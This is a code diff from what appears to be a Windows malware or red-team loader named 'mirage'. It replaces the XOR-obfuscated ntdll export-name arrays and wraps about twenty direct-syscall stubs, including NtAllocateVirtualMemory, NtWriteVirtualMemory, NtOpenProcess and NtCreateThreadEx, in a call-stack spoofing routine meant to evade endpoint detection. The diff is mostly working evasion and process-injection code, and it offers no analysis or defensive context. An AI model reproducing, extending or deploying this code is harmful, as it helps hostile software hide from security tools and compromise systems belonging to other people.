@@ -11,6 +11,7 @@
 #include "config.h"
 #include "mirage_asm.h"
 #include "enc_strings.h"
+#include "stack_spoof.h"
 #include <stddef.h>
 #include <windows.h>
 
@@ -320,29 +321,29 @@ uint32_t ssn_xor_key = 0xA3B5C7D9;
 
 /* ═══════ XOR-obfuscated export names ══════════════════════════ */
 
-static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0x5f, 0x1a, 0x03, 0x7f, 0xad, 0xe9, 0x4e, 0x0b, 0xaa, 0x01, 0x87, 0x8b, 0xbc, 0x15, 0x14, 0xef, 0x7d, 0x23, 0x27, 0x7e, 0xae, 0xf4, 0x54 };
-static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0x5f, 0x1a, 0x12, 0x61, 0xae, 0xf2, 0x48, 0x09, 0xaa, 0x32, 0xb8, 0x90, 0xba, 0x14, 0x00, 0xe2, 0x5c, 0x0b, 0x2f, 0x7c, 0xb3, 0xff };
-static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0x5f, 0x1a, 0x04, 0x61, 0xa4, 0xe3, 0x7b, 0x03, 0xac, 0x10, 0xa4, 0x83, 0xa2, 0x2c, 0x04, 0xe3, 0x7e, 0x1c, 0x3b };
-static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0x5f, 0x1a, 0x15, 0x61, 0xa8, 0xf2, 0x48, 0x3c, 0xb7, 0x16, 0xa5, 0x97, 0xaf, 0x0d, 0x2c, 0xeb, 0x7c, 0x01, 0x30, 0x6a };
-static const unsigned char _NtReadVirtualMemory_obf[19] = { 0x5f, 0x1a, 0x10, 0x76, 0xa0, 0xe2, 0x7b, 0x03, 0xac, 0x10, 0xa4, 0x83, 0xa2, 0x2c, 0x04, 0xe3, 0x7e, 0x1c, 0x3b };
-static const unsigned char _NtClose_obf[7] = { 0x5f, 0x1a, 0x01, 0x7f, 0xae, 0xf5, 0x48 };
-static const unsigned char _NtQuerySystemInformation_obf[24] = { 0x5f, 0x1a, 0x13, 0x66, 0xa4, 0xf4, 0x54, 0x39, 0xa7, 0x17, 0xa5, 0x87, 0xa3, 0x28, 0x0f, 0xe8, 0x7e, 0x1c, 0x2f, 0x72, 0xb5, 0xef, 0x42, 0x04 };
-static const unsigned char _NtQueryInformationProcess_obf[25] = { 0x5f, 0x1a, 0x13, 0x66, 0xa4, 0xf4, 0x54, 0x23, 0xb0, 0x02, 0xbe, 0x90, 0xa3, 0x00, 0x15, 0xe7, 0x7e, 0x00, 0x12, 0x61, 0xae, 0xe5, 0x48, 0x19, 0xad };
-static const unsigned char _NtDelayExecution_obf[16] = { 0x5f, 0x1a, 0x06, 0x76, 0xad, 0xe7, 0x54, 0x2f, 0xa6, 0x01, 0xb2, 0x97, 0xba, 0x08, 0x0e, 0xe0 };
-static const unsigned char _NtOpenFile_obf[10] = { 0x5f, 0x1a, 0x0d, 0x63, 0xa4, 0xe8, 0x6b, 0x03, 0xb2, 0x01 };
-static const unsigned char _NtWriteFile_obf[11] = { 0x5f, 0x1a, 0x15, 0x61, 0xa8, 0xf2, 0x48, 0x2c, 0xb7, 0x08, 0xb4 };
-static const unsigned char _NtSetInformationProcess_obf[23] = { 0x5f, 0x1a, 0x11, 0x76, 0xb5, 0xcf, 0x43, 0x0c, 0xb1, 0x16, 0xbc, 0x83, 0xba, 0x08, 0x0e, 0xe0, 0x41, 0x1c, 0x2d, 0x70, 0xa4, 0xf5, 0x5e };
-static const unsigned char _NtOpenKey_obf[9] = { 0x5f, 0x1a, 0x0d, 0x63, 0xa4, 0xe8, 0x66, 0x0f, 0xa7 };
-static const unsigned char _NtQueryValueKey_obf[15] = { 0x5f, 0x1a, 0x13, 0x66, 0xa4, 0xf4, 0x54, 0x3c, 0xbf, 0x08, 0xa4, 0x87, 0x85, 0x04, 0x18 };
-static const unsigned char _NtOpenProcess_obf[13] = { 0x5f, 0x1a, 0x0d, 0x63, 0xa4, 0xe8, 0x7d, 0x18, 0xb1, 0x07, 0xb4, 0x91, 0xbd };
-static const unsigned char _NtCreateThreadEx_obf[16] = { 0x5f, 0x1a, 0x01, 0x61, 0xa4, 0xe7, 0x59, 0x0f, 0x8a, 0x0c, 0xa3, 0x87, 0xaf, 0x05, 0x24, 0xf6 };
-static const unsigned char _NtFlushInstructionCache_obf[23] = { 0x5f, 0x1a, 0x04, 0x7f, 0xb4, 0xf5, 0x45, 0x23, 0xb0, 0x17, 0xa5, 0x90, 0xbb, 0x02, 0x15, 0xe7, 0x7e, 0x00, 0x01, 0x72, 0xa2, 0xee, 0x48 };
-static const unsigned char _NtCreateEvent_obf[13] = { 0x5f, 0x1a, 0x01, 0x61, 0xa4, 0xe7, 0x59, 0x0f, 0x9b, 0x12, 0xb4, 0x8c, 0xba };
-static const unsigned char _NtDeleteFile_obf[12] = { 0x5f, 0x1a, 0x06, 0x76, 0xad, 0xe3, 0x59, 0x0f, 0x98, 0x0d, 0xbd, 0x87 };
-static const unsigned char _NtSetInformationFile_obf[20] = { 0x5f, 0x1a, 0x11, 0x76, 0xb5, 0xcf, 0x43, 0x0c, 0xb1, 0x16, 0xbc, 0x83, 0xba, 0x08, 0x0e, 0xe0, 0x57, 0x07, 0x2e, 0x76 };
-static const unsigned char _NtCreateFile_obf[12] = { 0x5f, 0x1a, 0x01, 0x61, 0xa4, 0xe7, 0x59, 0x0f, 0x98, 0x0d, 0xbd, 0x87 };
-static const unsigned char _NtEnumerateKey_obf[14] = { 0x5f, 0x1a, 0x07, 0x7d, 0xb4, 0xeb, 0x48, 0x18, 0xbf, 0x10, 0xb4, 0xa9, 0xab, 0x18 };
-static const unsigned char _ntdll_dll_obf[9] = { 0x7f, 0x1a, 0x26, 0x7f, 0xad, 0xa8, 0x49, 0x06, 0xb2 };
+static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0xe1, 0xd0, 0xf0, 0x04, 0x42, 0x1b, 0xc8, 0xd6, 0x49, 0xf9, 0xe1, 0xf9, 0x56, 0x08, 0xe2, 0x37, 0xc3, 0xe9, 0xd4, 0x05, 0x41, 0x06, 0xd2 };
+static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0xe1, 0xd0, 0xe1, 0x1a, 0x41, 0x00, 0xce, 0xd4, 0x49, 0xca, 0xde, 0xe2, 0x50, 0x09, 0xf6, 0x3a, 0xe2, 0xc1, 0xdc, 0x07, 0x5c, 0x0d };
+static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0xe1, 0xd0, 0xf7, 0x1a, 0x4b, 0x11, 0xfd, 0xde, 0x4f, 0xe8, 0xc2, 0xf1, 0x48, 0x31, 0xf2, 0x3b, 0xc0, 0xd6, 0xc8 };
+static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0xe1, 0xd0, 0xe6, 0x1a, 0x47, 0x00, 0xce, 0xe1, 0x54, 0xee, 0xc3, 0xe5, 0x45, 0x10, 0xda, 0x33, 0xc2, 0xcb, 0xc3, 0x11 };
+static const unsigned char _NtReadVirtualMemory_obf[19] = { 0xe1, 0xd0, 0xe3, 0x0d, 0x4f, 0x10, 0xfd, 0xde, 0x4f, 0xe8, 0xc2, 0xf1, 0x48, 0x31, 0xf2, 0x3b, 0xc0, 0xd6, 0xc8 };
+static const unsigned char _NtClose_obf[7] = { 0xe1, 0xd0, 0xf2, 0x04, 0x41, 0x07, 0xce };
+static const unsigned char _NtQuerySystemInformation_obf[24] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xe4, 0x44, 0xef, 0xc3, 0xf5, 0x49, 0x35, 0xf9, 0x30, 0xc0, 0xd6, 0xdc, 0x09, 0x5a, 0x1d, 0xc4, 0xd9 };
+static const unsigned char _NtQueryInformationProcess_obf[25] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xfe, 0x53, 0xfa, 0xd8, 0xe2, 0x49, 0x1d, 0xe3, 0x3f, 0xc0, 0xca, 0xe1, 0x1a, 0x41, 0x17, 0xce, 0xc4, 0x4e };
+static const unsigned char _NtDelayExecution_obf[16] = { 0xe1, 0xd0, 0xf5, 0x0d, 0x42, 0x15, 0xd2, 0xf2, 0x45, 0xf9, 0xd4, 0xe5, 0x50, 0x15, 0xf8, 0x38 };
+static const unsigned char _NtOpenFile_obf[10] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xed, 0xde, 0x51, 0xf9 };
+static const unsigned char _NtWriteFile_obf[11] = { 0xe1, 0xd0, 0xe6, 0x1a, 0x47, 0x00, 0xce, 0xf1, 0x54, 0xf0, 0xd2 };
+static const unsigned char _NtSetInformationProcess_obf[23] = { 0xe1, 0xd0, 0xe2, 0x0d, 0x5a, 0x3d, 0xc5, 0xd1, 0x52, 0xee, 0xda, 0xf1, 0x50, 0x15, 0xf8, 0x38, 0xff, 0xd6, 0xde, 0x0b, 0x4b, 0x07, 0xd8 };
+static const unsigned char _NtOpenKey_obf[9] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xe0, 0xd2, 0x44 };
+static const unsigned char _NtQueryValueKey_obf[15] = { 0xe1, 0xd0, 0xe0, 0x1d, 0x4b, 0x06, 0xd2, 0xe1, 0x5c, 0xf0, 0xc2, 0xf5, 0x6f, 0x19, 0xee };
+static const unsigned char _NtOpenProcess_obf[13] = { 0xe1, 0xd0, 0xfe, 0x18, 0x4b, 0x1a, 0xfb, 0xc5, 0x52, 0xff, 0xd2, 0xe3, 0x57 };
+static const unsigned char _NtCreateThreadEx_obf[16] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x69, 0xf4, 0xc5, 0xf5, 0x45, 0x18, 0xd2, 0x2e };
+static const unsigned char _NtFlushInstructionCache_obf[23] = { 0xe1, 0xd0, 0xf7, 0x04, 0x5b, 0x07, 0xc3, 0xfe, 0x53, 0xef, 0xc3, 0xe2, 0x51, 0x1f, 0xe3, 0x3f, 0xc0, 0xca, 0xf2, 0x09, 0x4d, 0x1c, 0xce };
+static const unsigned char _NtCreateEvent_obf[13] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x78, 0xea, 0xd2, 0xfe, 0x50 };
+static const unsigned char _NtDeleteFile_obf[12] = { 0xe1, 0xd0, 0xf5, 0x0d, 0x42, 0x11, 0xdf, 0xd2, 0x7b, 0xf5, 0xdb, 0xf5 };
+static const unsigned char _NtSetInformationFile_obf[20] = { 0xe1, 0xd0, 0xe2, 0x0d, 0x5a, 0x3d, 0xc5, 0xd1, 0x52, 0xee, 0xda, 0xf1, 0x50, 0x15, 0xf8, 0x38, 0xe9, 0xcd, 0xdd, 0x0d };
+static const unsigned char _NtCreateFile_obf[12] = { 0xe1, 0xd0, 0xf2, 0x1a, 0x4b, 0x15, 0xdf, 0xd2, 0x7b, 0xf5, 0xdb, 0xf5 };
+static const unsigned char _NtEnumerateKey_obf[14] = { 0xe1, 0xd0, 0xf4, 0x06, 0x5b, 0x19, 0xce, 0xc5, 0x5c, 0xe8, 0xd2, 0xdb, 0x41, 0x05 };
+static const unsigned char _ntdll_dll_obf[9] = { 0xc1, 0xd0, 0xd5, 0x04, 0x42, 0x5a, 0xcf, 0xdb, 0x51 };
 static void deobf_str(const unsigned char *obf, size_t len, char *out) {
     for (size_t i = 0; i < len; i++)
         out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
@@ -384,9 +385,12 @@ static void* resolve_export_obf(const unsigned char *obf, size_t len) {
     deobf_str(obf, (len < sizeof(name)) ? len : (sizeof(name) - 1), name);
     return mirage_get_function_by_hash(ntdll, mirage_encrypted_hash_func(name));
 }
-
 NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtAllocateVirtualMemory_stub,
+                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtAllocateVirtualMemory_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,f);
     }
     static pNtAllocateVirtualMemory fn = NULL;
@@ -396,6 +400,10 @@ NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, 
 
 NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtProtectVirtualMemory_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtProtectVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtProtectVirtualMemory fn = NULL;
@@ -405,6 +413,10 @@ NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, U
 
 NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFreeVirtualMemory_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtFreeVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d);
     }
     static pNtFreeVirtualMemory fn = NULL;
@@ -414,6 +426,10 @@ NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
 
 NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteVirtualMemory_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtWriteVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtWriteVirtualMemory fn = NULL;
@@ -423,6 +439,10 @@ NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_
 
 NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtReadVirtualMemory_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtReadVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtReadVirtualMemory fn = NULL;
@@ -432,6 +452,10 @@ NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T
 
 NTSTATUS mirage_NtClose(HANDLE a) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtClose_stub,
+                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtClose_stub((uint64_t)a);
     }
     static pNtClose fn = NULL;
@@ -441,6 +465,10 @@ NTSTATUS mirage_NtClose(HANDLE a) {
 
 NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQuerySystemInformation_stub,
+                a, (uint64_t)b, c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtQuerySystemInformation_stub(a,(uint64_t)b,c,(uint64_t)d);
     }
     static pNtQuerySystemInformation fn = NULL;
@@ -450,6 +478,10 @@ NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
 
 NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryInformationProcess_stub,
+                (uint64_t)a, b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtQueryInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtQueryInformationProcess fn = NULL;
@@ -459,6 +491,10 @@ NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, U
 
 NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDelayExecution_stub,
+                a, (uint64_t)b, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtDelayExecution_stub(a,(uint64_t)b);
     }
     static pNtDelayExecution fn = NULL;
@@ -468,6 +504,10 @@ NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
 
 NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateFile_stub,
+                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, f, g, h, i, (uint64_t)j, k);
+        }
         return (NTSTATUS)NtCreateFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,f,g,h,i,(uint64_t)j,k);
     }
     static pNtCreateFile fn = NULL;
@@ -477,6 +517,10 @@ NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULON
 
 NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenFile_stub,
+                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtOpenFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,e,f);
     }
     static pNtOpenFile fn = NULL;
@@ -486,6 +530,10 @@ NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG 
 
 NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteFile_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, (uint64_t)h, (uint64_t)i, 0, 0);
+        }
         return (NTSTATUS)NtWriteFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,(uint64_t)h,(uint64_t)i);
     }
     static pNtWriteFile fn = NULL;
@@ -495,6 +543,10 @@ NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID
 
 NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationProcess_stub,
+                (uint64_t)a, b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtSetInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d);
     }
     static pNtSetInformationProcess fn = NULL;
@@ -504,6 +556,10 @@ NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
 
 NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenKey_stub,
+                (uint64_t)a, b, (uint64_t)c, 0, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtOpenKey_stub((uint64_t)a,b,(uint64_t)c);
     }
     static pNtOpenKey fn = NULL;
@@ -513,6 +569,10 @@ NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
 
 NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryValueKey_stub,
+                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, (uint64_t)f, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtQueryValueKey_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,(uint64_t)f);
     }
     static pNtQueryValueKey fn = NULL;
@@ -522,6 +582,10 @@ NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, UL
 
 NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenProcess_stub,
+                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtOpenProcess_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d);
     }
     static pNtOpenProcess fn = NULL;
@@ -531,6 +595,10 @@ NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
 
 NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateThreadEx_stub,
+                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, h, i, j, (uint64_t)k);
+        }
         return (NTSTATUS)NtCreateThreadEx_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,h,i,j,(uint64_t)k);
     }
     static pNtCreateThreadEx fn = NULL;
@@ -540,6 +608,10 @@ NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e,
 
 NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFlushInstructionCache_stub,
+                (uint64_t)a, (uint64_t)b, c, 0, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtFlushInstructionCache_stub((uint64_t)a,(uint64_t)b,c);
     }
     static pNtFlushInstructionCache fn = NULL;
@@ -549,6 +621,10 @@ NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
 
 NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateEvent_stub,
+                (uint64_t)a, b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtCreateEvent_stub((uint64_t)a,b,(uint64_t)c,d,e);
     }
     static pNtCreateEvent fn = NULL;
@@ -558,6 +634,10 @@ NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
 
 NTSTATUS mirage_NtDeleteFile(PVOID a) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDeleteFile_stub,
+                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtDeleteFile_stub((uint64_t)a);
     }
     static pNtDeleteFile fn = NULL;
@@ -567,6 +647,10 @@ NTSTATUS mirage_NtDeleteFile(PVOID a) {
 
 NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) {
     if (!g_use_fallback) {
+        if (g_spoof_ready) {
+            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationFile_stub,
+                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
+        }
         return (NTSTATUS)NtSetInformationFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,e);
     }
     static pNtSetInformationFile fn = NULL;
